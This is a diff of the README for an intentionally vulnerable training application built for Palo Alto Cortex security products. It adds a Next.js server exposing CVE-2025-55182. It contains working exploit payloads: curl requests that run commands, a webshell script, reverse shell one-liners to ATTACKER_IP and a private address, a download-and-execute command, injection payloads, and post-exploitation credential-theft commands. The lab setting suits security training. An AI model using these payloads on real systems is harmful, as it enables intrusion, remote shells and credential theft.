@@ -4,13 +4,13 @@
 
 ## Overview
 
-GoCortex Broken Bank is an intentionally vulnerable application designed specifically to support Palo Alto Networks Cortex Cloud + Palo Alto Networks Cortex XSIAM/XDR training. This application serves as a comprehensive testing ground for CI/CD security validation pipelines, featuring a wide range of deliberately implemented security vulnerabilities that mirror real-world common misconfigurations ready for assessment and exploitation.
+GoCortex Broken Bank is an intentionally vulnerable application designed specifically to support Palo Alto Networks Cortex Cloud + Palo Alto Networks Cortex XSIAM/XDR training. It contains deliberately implemented security vulnerabilities for CI/CD security validation, covering common misconfigurations for assessment and exploitation.
 
 ![GoCortex Broken Bank Application](static/images/app-screenshot.png)
 
-## Dual-Server Architecture
+## Tri-Server Architecture
 
-The application is split into two servers: a Flask service for SAST-style findings and a Tomcat service for realistic Java RCE testing.
+The application is split into three servers: a Flask service for SAST-style findings, a Tomcat service for realistic Java RCE testing, and a React/Next.js service exposing CVE-2025-55182 (React2Shell RCE).
 
 ### Flask/Gunicorn Server (Port 8888)
 - **Purpose**: SAST (Static Application Security Testing) endpoints
@@ -24,13 +24,20 @@ The application is split into two servers: a Flask service for SAST-style findin
 - **Coverage**: 6 critical RCE endpoints including Spring4Shell (CVE-2022-22965)
 - **Testing Focus**: Enterprise Java exploitation scenarios commonly targeted by DAST and RCE detection engines
 
-**Why Dual-Server Architecture?**
+### React/Next.js Server (Port 7777)
+- **Purpose**: SpaceATM Terminal simulator exposing React Server Components RCE (CVE-2025-55182)
+- **Technology**: Next.js 16.0.6, React 19.2.0, Node.js 20
+- **Coverage**: Pre-authentication RCE via RSC Flight protocol deserialisation
+- **Testing Focus**: Modern JavaScript framework vulnerabilities, supply chain risk from vulnerable React/Next.js versions
 
-Security scanners and penetration testing tools treat Tomcat differently from lightweight Python servers. By hosting exploit endpoints on Tomcat:
+**Why Tri-Server Architecture?**
+
+Security scanners and penetration testing tools treat each runtime differently. By hosting endpoints on their native platforms:
 - Improves detection rates in tools that treat Tomcat-based applications differently from lightweight Python services
 - Realistic Java/Spring vulnerability testing
-- Improved scanner recognition of critical RCE endpoints
-- Better alignment with real-world enterprise application stacks
+- Scanner recognition of critical RCE endpoints on their native platform
+- Alignment with real-world enterprise application stacks
+- Modern JavaScript framework RCE testing via deliberately vulnerable React/Next.js versions
 
 ## Purpose
 
@@ -46,8 +53,8 @@ This application contains **intentionally vulnerable code** implementing multipl
 
 ### Flask/Gunicorn Vulnerability Endpoints (42 Endpoints - Port 8888)
 
-**Endpoint Exploitability Guide**: For detailed information about which Flask endpoints are truly exploitable versus simulation-only, see **[ENDPOINTS_EXPLOITABILITY.md](docs/ENDPOINTS_EXPLOITABILITY.md)** which categorises all 42 endpoints by their actual exploitability level:
-- **30 Truly Exploitable** - Endpoints that genuinely execute vulnerable code, rather than returning static or simulated results
+**Endpoint Exploitability Guide**: For detailed information about which Flask endpoints are exploitable versus simulation-only, see **[ENDPOINTS_EXPLOITABILITY.md](docs/ENDPOINTS_EXPLOITABILITY.md)** which categorises all 42 endpoints by their actual exploitability level:
+- **30 Exploitable** - Endpoints that execute vulnerable code rather than returning static results
 - **6 Partially Exploitable** - Execute code with limitations or simulated behaviour  
 - **6 Simulation Only** - Return configuration strings for SAST scanner detection
 
@@ -104,6 +111,16 @@ This application contains **intentionally vulnerable code** implementing multipl
 | **Dynamic Class Loading** | `/exploit-app/dynamic` | Arbitrary code execution via URLClassLoader from remote JAR files | Java URLClassLoader | CWE-470 |
 | **Script Engine Evaluation** | `/exploit-app/eval` | JavaScript/Groovy code execution through ScriptEngine API | Nashorn, Groovy | CWE-95 |
 | **Spring4Shell RCE** | `/exploit-app/spring4shell` | Class loader manipulation for JSP webshell deployment | Spring Framework 5.3.0 | **CVE-2022-22965** |
+
+### React/Next.js SpaceATM Terminal (Next.js 16.0.6 - Port 7777)
+
+| Vulnerability Type | Endpoint | Description | Technology | CVE References |
+|-------------------|----------|-------------|------------|---------------|
+| **RSC Flight Protocol RCE** | `POST /` (any route) | React Server Components Flight protocol deserialisation RCE via `Next-Action` header | Next.js 16.0.6, React 19.2.0 | CVE-2025-55182 (CVSS 10.0), CVE-2025-66478 |
+
+#### CVE-2025-55182 / CVE-2025-66478 - React2Shell (Pre-Authentication RCE)
+
+The SpaceATM Terminal runs a deliberately vulnerable version of Next.js (16.0.6) with React 19.2.0, exposing a critical deserialisation vulnerability in the React Server Components Flight protocol. The vulnerability is in the framework itself: any `POST` request to any route with a `Next-Action` header triggers the RSC deserialisation handler, which unsafely evaluates attacker-controlled payloads. No authentication is required.
 
 ### Tomcat 8.5.0 Known Vulnerabilities
 
@@ -171,7 +188,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
 
 ### License Compliance Testing (PyGremlinBox Integration)
 
-GoCortex Broken Bank integrates **71 PyGremlinBox packages** (65 varied license packages + 6 malware simulation packages) by Simon Sigre for comprehensive license compliance and malware simulation testing:
+GoCortex Broken Bank integrates **71 PyGremlinBox packages** (65 varied license packages + 6 malware simulation packages) by Simon Sigre for license compliance and malware simulation testing:
 
 | License Type | Package | Policy Risk Level | SCA Detection Trigger |
 |-------------|---------|-------------------|----------------------|
@@ -252,8 +269,8 @@ GoCortex Broken Bank integrates **71 PyGremlinBox packages** (65 varied license 
 | **Credential Harvesting** | `pygremlinbox-malware-credential-harvesting` | MALWARE | Credential theft detection signatures |
 | **Cryptomining Indicators** | `pygremlinbox-malware-cryptomining-indicators` | MALWARE | Cryptomining activity detection patterns |
 
-**Enhanced License Testing Features:**
-- **65 Diverse License Types** for comprehensive SCA policy coverage
+**License Testing Features:**
+- **65 Diverse License Types** for SCA policy coverage
 - **Commercial Use Restrictions** triggering compliance alerts  
 - **Copyleft Obligations** requiring source code disclosure
 - **Network Copyleft Clauses** (AGPL, SSPL) for SaaS applications
@@ -280,7 +297,7 @@ The application includes **5 fictitious threat domains** embedded throughout the
 | **botnet.sigre.xyz** | Botnet simulation domain for cybersecurity testing | app.py, config.py, secrets.py |
 
 **Important:** These domains are entirely fictitious and used solely for validating URL filtering and threat detection capabilities. They are embedded within:
-- Application source code for comprehensive testing coverage
+- Application source code for testing coverage
 - Configuration files for security scanner validation
 - Secret management files for realistic threat simulation
 - Test configuration files for systematic validation
@@ -289,7 +306,7 @@ The application includes **5 fictitious threat domains** embedded throughout the
 
 ### Tomcat Exploit Endpoints - Remote Code Execution (Port 9999)
 
-The following CURL commands demonstrate exploitation of Java/Tomcat endpoints for comprehensive penetration testing:
+The following CURL commands demonstrate exploitation of Java/Tomcat endpoints for exploitation testing:
 
 | Vulnerability Type | Endpoint | CURL Command Example | Attack Purpose |
 |-------------------|----------|---------------------|-------------|
@@ -444,7 +461,7 @@ The WAR file includes all necessary dependencies:
 
 ### Tomcat Manager Application Access
 
-The Tomcat Manager application is configured with intentionally weak credentials for comprehensive testing:
+The Tomcat Manager application is configured with intentionally weak credentials:
 
 | Username | Password | Roles | Access Level |
 |----------|----------|-------|-------------|
@@ -465,80 +482,200 @@ curl -u admin:admin -T malicious.war http://localhost:9999/manager/text/deploy?p
 curl -u admin:admin http://localhost:9999/manager/text/list
 ```
 
-### Flask SAST Vulnerability Examples (Port 8888)
+### Flask Vulnerability Examples (Port 8888)
 
-**Note:** Remote code execution endpoints (file upload, command execution) have been migrated to Tomcat (port 9999) for enhanced security scanner detection. Flask now focuses on SAST vulnerabilities, secrets detection, and license compliance testing.
+The following examples demonstrate Flask SAST vulnerabilities for security testing.
 
-The following CURL commands demonstrate Flask SAST vulnerabilities for security testing:
+#### Injection Attacks
 
-| Vulnerability Type | Endpoint | CURL Command Example | Attack Purpose |
-|-------------------|----------|---------------------|-------------|
-| **SQL Injection** | `/search` | `curl "http://localhost:8888/search?q=' OR '1'='1"` | Demonstrates SQL injection allowing unauthorised database access |
-| **Cross-Site Scripting (XSS)** | `/comment` | `curl "http://localhost:8888/comment?comment=<script>alert(document.cookie)</script>"` | Stored XSS vulnerability allowing JavaScript injection |
-| **SSRF (Server-Side Request Forgery)** | `/fetch` | `curl "http://localhost:8888/fetch?url=http://169.254.169.254/latest/meta-data/"` | SSRF attack against cloud metadata endpoints |
-| **XXE (XML External Entity)** | `/xml` | `curl -X POST "http://localhost:8888/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'` | XML parser exploitation to read arbitrary files |
-| **LDAP Injection** | `/ldap` | `curl "http://localhost:8888/ldap?user=admin)(|(password=*"` | LDAP query injection for authentication bypass |
-| **Path Traversal** | `/file` | `curl "http://localhost:8888/file?name=../../../../etc/passwd"` | Directory traversal to read sensitive system files |
-| **Insecure Deserialisation** | `/deserialize` | `curl "http://localhost:8888/deserialize?data=pickle_payload"` | Python pickle deserialisation vulnerability |
-| **Template Injection** | `/template` | `curl "http://localhost:8888/template?content={{7*7}}"` | Server-Side Template Injection (SSTI) in Jinja2 |
+```bash
+curl "http://localhost:8888/search?q=' OR '1'='1"
+curl "http://localhost:8888/ldap?user=admin)(|(password=*"
+```
+
+#### Cross-Site Scripting (XSS)
+
+```bash
+curl "http://localhost:8888/comment?comment=<script>alert(document.cookie)</script>"
+```
+
+#### Server-Side Request Forgery (SSRF)
+
+```bash
+curl "http://localhost:8888/fetch?url=http://169.254.169.254/latest/meta-data/"
+```
+
+#### XML External Entity (XXE)
+
+```bash
+curl -X POST "http://localhost:8888/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+#### Path Traversal
+
+```bash
+curl "http://localhost:8888/file?name=../../../../etc/passwd"
+```
+
+#### Insecure Deserialisation
+
+```bash
+curl "http://localhost:8888/deserialize?data=pickle_payload"
+```
+
+#### Template Injection (SSTI)
+
+```bash
+curl "http://localhost:8888/template?content={{7*7}}"
+```
 
 ### Advanced Exploitation Examples (Tomcat Endpoints)
 
-**Note:** These advanced exploitation examples use Tomcat endpoints (port 9999) for enhanced realism and scanner detection.
+**Note:** These advanced exploitation examples use Tomcat endpoints (port 9999) for scanner detection.
 
 | Attack Vector | CURL Command | Attack Purpose |
 |--------------|-------------|--------|
+| **Read Password File** | `curl "http://localhost:9999/exploit-app/execute?cmd=cat+/etc/passwd"` | Extracts system user accounts and home directories for privilege mapping |
+| **Attempt Shadow Access** | `curl "http://localhost:9999/exploit-app/execute?cmd=cat+/etc/shadow"` | Attempts to read password hashes (typically permission denied) |
+| **Check Sudo Privileges** | `curl "http://localhost:9999/exploit-app/execute?cmd=sudo+-l"` | Enumerates sudo permissions for privilege escalation paths |
+| **Network Port Enumeration** | `curl "http://localhost:9999/exploit-app/execute?cmd=netstat+-tlnp"` | Discovers listening services for lateral movement opportunities |
+| **Environment Secrets** | `curl "http://localhost:9999/exploit-app/execute?cmd=env"` | Extracts environment variables containing API keys and credentials |
+| **SSH Key Discovery** | `curl "http://localhost:9999/exploit-app/execute?cmd=ls+-la+/root/.ssh/"` | Searches for SSH keys enabling access to other systems |
+| **Find SUID Binaries** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=find / -perm -4000 2>/dev/null"` | Discovers SUID binaries for potential privilege escalation to root access |
+| **Process Enumeration** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=ps aux \| grep -i java"` | Enumerates running processes to identify security monitoring tools |
 | **Reverse Shell via Java** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"` | Establishes outbound connection to attacker-controlled server bypassing firewalls |
-| **Privilege Escalation Check** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"` | Discovers SUID binaries for potential privilege escalation to root access |
-| **Memory Enumeration** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=ps aux \| grep -i tomcat"` | Enumerates running processes to identify security monitoring tools |
-| **Download and Execute Payload** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"` | Multi-stage attack downloading and executing external malware sample |
+| **Download and Execute Payload** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode 'cmd=wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload'` | Multi-stage attack downloading and executing external malware sample (may hang during payload execution) |
 
-### Complete Flask Endpoint Testing Examples
+### React/Next.js SpaceATM Terminal - CVE-2025-55182 (Port 7777)
 
-The following comprehensive testing examples cover all 42 Flask vulnerability endpoints on port 8888:
+The SpaceATM Terminal runs on Next.js 16.0.6 with React 19.2.0, exposing CVE-2025-55182 (React2Shell pre-authentication RCE) via the RSC Flight protocol deserialisation handler. Any `POST` request to any route with a `Next-Action` header triggers the vulnerable code path. No authentication is required.
 
-| Vulnerability Type | Endpoint | CURL Test Command | Expected Response |
-|-------------------|----------|-------------------|------------------|
-| **SQL Injection** | `/search` | `curl "http://localhost:8888/search?q=test"` | Search query executed: SELECT * FROM users WHERE name LIKE '%test%' |
-| **Cross-Site Scripting** | `/comment` | `curl "http://localhost:8888/comment?comment=<script>alert('xss')</script>"` | Your comment: &lt;script&gt;alert('xss')&lt;/script&gt; |
-| **LDAP Injection** | `/ldap` | `curl "http://localhost:8888/ldap?user=admin"` | LDAP search filter: (uid=admin) |
-| **Insecure Deserialisation** | `/deserialize` | `curl "http://localhost:8888/deserialize?data=test"` | Invalid data format |
-| **Server-Side Request Forgery** | `/fetch` | `curl "http://localhost:8888/fetch?url=http://example.com"` | Failed to fetch: http://example.com |
-| **XML External Entity** | `/xml` | `curl "http://localhost:8888/xml?data=%3Croot%3Etest%3C%2Froot%3E"` | XML parsed successfully: root - test |
-| **HTTP Header Injection** | `/redirect` | `curl "http://localhost:8888/redirect?url=http://example.com"` | Redirecting... |
-| **Weak SSL/TLS Configuration** | `/ssl_test` | `curl "http://localhost:8888/ssl_test"` | SSL context configured with weak security settings |
-| **Weak Cryptography** | `/hash` | `curl "http://localhost:8888/hash?password=test"` | MD5 hash: 098f6bcd4621d373cade4e832627b4f6 |
-| **Weak AES Encryption** | `/encrypt` | `curl "http://localhost:8888/encrypt?data=test"` | Encrypted with static IV: [hex output] |
-| **Unauthenticated Key Exchange** | `/keyexchange` | `curl "http://localhost:8888/keyexchange"` | Key exchange performed without entity authentication |
-| **Path Traversal** | `/file` | `curl "http://localhost:8888/file?name=../etc/passwd"` | Reading file: /app/data/../etc/passwd |
-| **Wildcard Injection** | `/wildcard` | `curl "http://localhost:8888/wildcard?pattern=*"` | Files matching pattern: [file list] |
-| **NoSQL Injection** | `/mongo` | `curl "http://localhost:8888/mongo?id=test"` | MongoDB query: db.users.find({'user_id': 'test'}) |
-| **Weak Database Authentication** | `/database` | `curl "http://localhost:8888/database?op=config"` | Database configuration: hardcoded credentials |
-| **JWT Without Verification** | `/token` | `curl "http://localhost:8888/token?jwt=test"` | Invalid JWT format |
-| **Improper Access Control** | `/admin` | `curl "http://localhost:8888/admin"` | Welcome to admin panel! Sensitive admin data here. |
-| **JSON Code Injection** | `/json` | `curl "http://localhost:8888/json?data={\"test\":1}"` | JSON processed: {'test': 1} |
-| **Information Disclosure** | `/debug` | `curl "http://localhost:8888/debug"` | [Application configuration data] |
-| **Insecure Logging** | `/log` | `curl "http://localhost:8888/log/sensitive_data"` | Logged message: sensitive_data |
-| **Template Injection** | `/template` | `curl "http://localhost:8888/template?content=test"` | &lt;h1&gt;User Input:&lt;/h1&gt;&lt;div&gt;test&lt;/div&gt; |
-| **Improper Exception Handling** | `/exception` | `curl "http://localhost:8888/exception"` | Exception handled (silently) |
-| **Weak Random Generation** | `/random` | `curl "http://localhost:8888/random"` | Random token: [predictable value] |
-| **None Attribute Access** | `/none` | `curl "http://localhost:8888/none"` | AttributeError: accessing None attributes |
-| **CSRF Protection Disabled** | `/transfer` | `curl -X POST "http://localhost:8888/transfer" -d "amount=100"` | Transfer completed (no CSRF protection) |
-| **Cleartext Credential Transmission** | `/credentials` | `curl "http://localhost:8888/credentials?user=admin&pass=secret"` | Credentials transmitted in cleartext |
-| **ML Model Download Without Integrity** | `/ml_model` | `curl "http://localhost:8888/ml_model?url=test"` | Failed to download model from test |
-| **PyTorch Missing Hash Check** | `/pytorch` | `curl "http://localhost:8888/pytorch?model=test"` | PyTorch model loaded without hash verification |
-| **TensorFlow Model Security** | `/tensorflow` | `curl "http://localhost:8888/tensorflow?model=test"` | TensorFlow model loaded without integrity verification |
-| **Redis Configuration Without SSL** | `/redis` | `curl "http://localhost:8888/redis"` | Redis configured without SSL |
-| **Improper Pathname Limitation** | `/download` | `curl "http://localhost:8888/download?file=test"` | Could not read file: /app/downloads/test |
-| **HTML Tag Neutralisation Failure** | `/html` | `curl "http://localhost:8888/html?content=<script>alert('xss')</script>"` | &lt;div&gt;User HTML: &lt;script&gt;alert('xss')&lt;/script&gt;&lt;/div&gt; |
-| **Uncontrolled Resource Consumption** | `/resource` | `curl "http://localhost:8888/resource?size=1000"` | Generated data of size: 1000000000 bytes |
-| **Resource Exhaustion** | `/exhaust` | `curl "http://localhost:8888/exhaust?size=5000"` | Memory allocated: 5000 bytes |
-| **Configuration Input Code Injection** | `/config` | `curl "http://localhost:8888/config?param=test"` | Configuration error with: debug=true |
-| **Custom URL Scheme Authorisation** | `/custom_scheme` | `curl "http://localhost:8888/custom_scheme?url=test"` | Handling custom URL scheme without proper authorisation |
-| **LDAP Anonymous Binding** | `/ldap_anon` | `curl "http://localhost:8888/ldap_anon"` | LDAP configured with anonymous bind |
-| **File Permission Vulnerabilities** | `/permissions` | `curl "http://localhost:8888/permissions?file=test&content=data"` | File created with 777 permissions |
-| **Insecure IPMI Configuration** | `/ipmi` | `curl "http://localhost:8888/ipmi"` | IPMI configured insecurely |
-| **Cleartext Email Transmission** | `/email` | `curl "http://localhost:8888/email?to=test@example.com&msg=test"` | Email sent via unencrypted SMTP |
+#### curl PoC (NEXT_REDIRECT Output Exfiltration)
+
+Based on the [OffSec verified PoC](https://www.offsec.com/blog/cve-2025-55182/). The payload uses the NEXT_REDIRECT error technique to exfiltrate command output directly in the HTTP response. This works from any network location -- loopback, Docker host, or remote machines. The CSRF origin check is patched out during the Docker build (`scripts/patch-csrf-origin-check.js`).
+
+Run `id` and exfiltrate output:
+
+```bash
+curl -s --max-time 5 -X POST http://TARGET:7777/ \
+  -H "Next-Action: x" \
+  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
+  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'id\',{timeout:5000}).toString().trim();throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:res});","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------Boundary--'
+```
+
+Expected response (HTTP 500 with command output in digest field):
+
+```
+0:{"a":"$@1","f":"","b":"..."}
+1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)"}
+```
+
+Run any command (replace `id` with your command):
+
+```bash
+curl -s --max-time 5 -X POST http://TARGET:7777/ \
+  -H "Next-Action: x" \
+  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
+  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'cat /etc/passwd\',{timeout:5000}).toString().trim();throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:res});","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------Boundary--'
+```
+
+#### Validation Script
+
+A Python validation script at `scripts/validate-react2shell.py` exploits CVE-2025-55182 and exfiltrates command output via the NEXT_REDIRECT error digest. Works from any network location (loopback, Docker host, or remote machines). Payload format based on [OffSec](https://www.offsec.com/blog/cve-2025-55182/) and [Trend Micro](https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html) verified PoCs.
+
+```bash
+# From any machine on the network:
+python3 validate-react2shell.py http://TARGET:7777 id
+
+# From the Docker host via docker exec:
+docker exec gocortex-broken-bank python3 /app/scripts/validate-react2shell.py http://localhost:7777 id
+
+# Custom commands:
+python3 validate-react2shell.py http://TARGET:7777 "cat /etc/passwd"
+python3 validate-react2shell.py http://TARGET:7777 "cat /opt/tomcat/conf/tomcat-users.xml"
+python3 validate-react2shell.py http://TARGET:7777 env
+```
+
+Expected output:
+```
+[*] CVE-2025-55182 (React2Shell) Exploit Validation
+[*] Target: http://TARGET:7777
+[*] Command: id
+
+[*] Sending NEXT_REDIRECT exfiltration payload...
+
+[*] Response status: 500
+[+] SUCCESS! Command output via NEXT_REDIRECT exfiltration:
+    uid=0(root) gid=0(root) groups=0(root)
+
+[+] CVE-2025-55182 RCE CONFIRMED
+```
+
+#### Interactive Webshell
+
+An interactive webshell script at `scripts/react2shell-webshell.py` provides a shell-like prompt over HTTP. Each command is sent via the NEXT_REDIRECT payload and the output is printed back. Works from any network location.
+
+```bash
+python3 react2shell-webshell.py http://TARGET:7777
+```
+
+Expected output:
+```
+[*] Connecting to target...
+[+] Shell established as root@container-id
+
+root@container-id:/app/react-app# id
+uid=0(root) gid=0(root) groups=0(root)
+root@container-id:/app/react-app# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+root@container-id:/app/react-app# exit
+[*] Closing webshell.
+```
+
+#### Reverse Shell
+
+Start a listener on the attacker machine, then send the reverse shell payload via curl. Replace `ATTACKER_IP` and `ATTACKER_PORT` with your listener address.
+
+Attacker (listener):
+```bash
+nc -lvnp 4444
+```
+
+Payload (from any machine -- works in bash and zsh):
+```bash
+# Step 1: Base64-encode the reverse shell command
+B64=$(printf 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64)
+
+# Step 2: Build the payload body (printf handles \r\n without $'...' quoting)
+PAYLOAD=$(printf '------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'echo %s | base64 -d | bash'"'"');","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------Boundary--' "$B64")
+
+# Step 3: Send
+curl -s --max-time 5 -X POST http://TARGET:7777/ \
+  -H "Next-Action: x" \
+  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
+  --data-binary "$PAYLOAD"
+```
+
+Or use the webshell script for a quick reverse shell:
+```bash
+python3 react2shell-webshell.py http://TARGET:7777
+root@target:/# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+Alternative reverse shells (use in the webshell prompt or base64-encode for curl):
+- Bash: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
+- Python: `python3 -c "import os,pty,socket;s=socket.socket();s.connect(('ATTACKER_IP',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('bash')"`
+- Netcat: `nc -e /bin/bash ATTACKER_IP 4444`
+
+#### Attack Commands
+
+Replace TARGET with the container IP or hostname. Replace the command in the curl `_prefix` field, the script argument, or type directly into the webshell:
+- `id`: identify user context (runs as root)
+- `cat /etc/passwd`: extract system user accounts
+- `env`: leak API keys, database credentials, and environment variables
+- `cat /app/instance/database.db | strings | head -50`: pivot to Flask database, extract user credentials
+- `cat /opt/tomcat/conf/tomcat-users.xml`: pivot to Tomcat, extract manager credentials
 
 ## CI/CD Integration
 
@@ -702,9 +839,9 @@ LOCALE=kr docker run -d -p 8888:8888 -p 9999:8080 -e LOCALE=kr gocortex-broken-b
 
 ### Attack Simulation Capabilities
 
-Version 1.3.6 introduces comprehensive chained attack validation with 7 multi-step attack scenarios modelled on real-world breaches (MOVEit, Okta, Ivanti). See also BB-REQ-012 (Exposed Local Git Repository) for demonstrating data exfiltration and credential theft scenarios.
+Version 1.4.0 introduces chained attack validation with 7 multi-step attack scenarios modelled on real-world breaches (MOVEit, Okta, Ivanti). The exposed local git repository enables data exfiltration and credential theft scenarios.
 
-#### BB-REQ-012: Exposed Local Git Repository
+#### Exposed Local Git Repository
 
 The application creates a vulnerable git repository at startup containing fictional intellectual property and planted secrets for security testing.
 
@@ -932,7 +1069,7 @@ The Dockerfile intentionally violates common container hardening policies to val
   - **Bundled Dependency CVEs**: psycopg2-binary 2.9.6 (OpenSSL, libpq vulnerabilities in bundled libraries)
   - **Pattern-Based Detection**: PyYAML 6.0 (unsafe_load patterns trigger SAST scanners without direct CVEs)
 
-**Note**: External services (MySQL, PostgreSQL, MongoDB, Redis, LDAP) are **mocked within the Flask application** rather than deployed as separate containers. This provides comprehensive vulnerability testing whilst maintaining a single-container deployment for simplicity.
+**Note**: External services (MySQL, PostgreSQL, MongoDB, Redis, LDAP) are **mocked within the Flask application** rather than deployed as separate containers. This provides vulnerability testing whilst maintaining a single-container deployment for simplicity.
 
 ### IaC Security Testing (Dockerfile.BrokenBank)
 
@@ -950,7 +1087,7 @@ The repository includes `Dockerfile.BrokenBank`, a dedicated file containing int
 | Insecure Patterns | ADD instead of COPY, curl pipe to shell, multiple RUN layers | MEDIUM |
 
 Key Features:
-- 30+ distinct IaC policy violations for comprehensive scanner coverage
+- 30+ distinct IaC policy violations for scanner coverage
 - Failsafe mechanism prevents accidental container builds
 - Vendor-neutral documentation without scanner-specific references
 - Covers certificate validation, package managers, credentials, and hardening gaps
